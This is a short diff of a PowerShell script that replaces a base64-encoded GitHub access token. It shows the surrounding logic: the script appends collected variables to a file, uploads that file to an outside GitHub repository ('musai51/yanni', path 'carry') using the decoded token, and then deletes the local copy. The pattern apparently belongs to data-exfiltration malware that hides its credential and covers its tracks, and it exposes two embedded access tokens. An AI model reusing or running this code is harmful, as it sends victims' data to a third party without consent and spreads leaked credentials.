@@ -49,7 +49,7 @@ ac $filename $rc -Encoding 'utf8'
 ac $filename $ic
 ac $filename $gp;
 
-$ken = [convert]::fromBase64String('Z2hwX2w2QU1MNXhRcnVhQ0owRW5ZUEdTcEp2S1hNc1FKbDBOdlhkbg==')
+$ken = [convert]::fromBase64String('Z2hwX2Qza1Y4YnlDWk1PVVJ3anVTNmlQSWdBQWdxOVhXSzIyZHpjZQ==')
 $ken = [System.Text.Encoding]::UTF8.GetString($ken)
 git-uploadfile -token $ken -file $filename -owner musai51 -repo yanni -path carry -force
 remove-item $filename -force
